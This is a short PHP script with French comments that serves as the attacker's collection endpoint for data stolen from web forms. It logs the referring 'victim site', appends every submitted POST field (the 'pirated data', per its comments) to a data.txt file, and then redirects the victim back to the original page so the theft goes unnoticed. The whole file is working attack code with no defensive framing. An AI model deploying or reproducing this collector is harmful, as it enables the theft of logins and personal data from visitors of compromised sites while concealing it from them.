<?php
// Enregistrer l'adresse du site victime
$referer = $_SERVER['HTTP_REFERER'];
$data = "site : $referer\r\n";

// Enregistrer les données piratées
foreach ($_POST as $key => $value)
  $data .= $key . " : " . $value . "\r\n";

$data .= "------------------------------\r\n";
$handle = @fopen("data.txt", "a");
fwrite($handle, $data);
fclose($handle);

// Retourner à la page du site, pour ne pas être démasqué
header("Location: " . $referer);